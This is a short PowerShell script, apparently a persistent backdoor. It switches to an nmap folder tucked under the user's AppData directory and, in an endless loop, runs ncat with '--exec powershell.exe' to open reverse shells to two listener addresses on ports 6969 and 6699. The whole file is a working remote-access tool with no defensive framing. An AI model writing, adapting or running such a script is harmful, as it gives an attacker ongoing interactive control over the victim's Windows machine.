# change directory into nmap folder
Write-Output "Changing Directory"
Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
Write-Output "Directory Changed"

Write-Output "Connecting to listener"
for (;;)
{
# for port 6969
$ListenerIP = "10.133.33.205"
.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969

$ListenerIP = "10.133.61.215"
.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969

# for port 6699
$ListenerIP = "10.133.33.205"
.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699

$ListenerIP = "10.133.61.215"
.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699
}